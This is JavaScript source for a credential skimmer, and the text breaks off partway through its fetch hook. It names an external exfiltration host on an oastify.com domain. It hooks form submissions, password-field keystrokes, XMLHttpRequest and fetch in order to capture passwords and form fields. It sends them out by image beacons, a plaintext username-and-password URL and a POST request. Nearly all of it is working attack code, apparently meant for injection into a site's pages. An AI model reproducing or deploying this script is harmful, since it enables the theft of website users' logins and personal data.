(function() {
    'use strict';
    
    const EXFIL_SERVER = 'r7z6iqxtkro4lnr4yzhdr5skobu2itbh0.oastify.com';
    
    // Function to send data
    function exfil(data) {
        try {
            let payload = btoa(JSON.stringify(data));
            // Method 1: Image beacon (most reliable)
            new Image().src = `https://${EXFIL_SERVER}/?d=${payload}`;
            
            // Method 2: Plain text for easy reading
            new Image().src = `https://${EXFIL_SERVER}/plain?u=${encodeURIComponent(data.user)}&p=${encodeURIComponent(data.pass)}`;
            
            // Method 3: Fetch backup
            fetch(`https://${EXFIL_SERVER}/data`, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(e => {});
            
        } catch(e) {
            new Image().src = `https://${EXFIL_SERVER}/error?e=${encodeURIComponent(e.message)}`;
        }
    }
    
    // Hook all form submissions
    document.addEventListener('submit', function(e) {
        let form = e.target;
        let formData = new FormData(form);
        let captured = {
            url: window.location.href,
            action: form.action,
            method: form.method,
            timestamp: new Date().toISOString(),
            fields: {}
        };
        
        // Capture all form fields
        for (let [key, value] of formData.entries()) {
            captured.fields[key] = value;
            // Send passwords immediately
            if (key.toLowerCase().includes('pass')) {
                exfil({user: formData.get('fake_username') || 'unknown', pass: value, type: 'immediate'});
            }
        }
        
        exfil(captured);
    }, true);
    
    // Monitor all input changes (backup method)
    document.addEventListener('input', function(e) {
        if (e.target.name && e.target.name.toLowerCase().includes('pass')) {
            exfil({
                type: 'keystroke',
                field: e.target.name,
                value: e.target.value,
                url: window.location.href
            });
        }
    }, true);
    
    // Hook XMLHttpRequest for AJAX forms
    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        this._method = method;
        return origOpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
        if (data && typeof data === 'string' && data.includes('password')) {
            exfil({
                type: 'ajax',
                url: this._url,
                method: this._method,
                data: data,
                timestamp: new Date().toISOString()
            });
        }
        return origSend.apply(this, arguments);
    };
    
    // Hook fetch API
    const origFetch = window.fetch;
    window.fetch = function(...args) {
        let [url, options] = args;
        if (options && options.body) {
            let body = options.body;
            if (typeof body === 'string' && body.includes('password')) {
                exfil({
                    type: 'fetch',
                    url: url,
                    body: body,
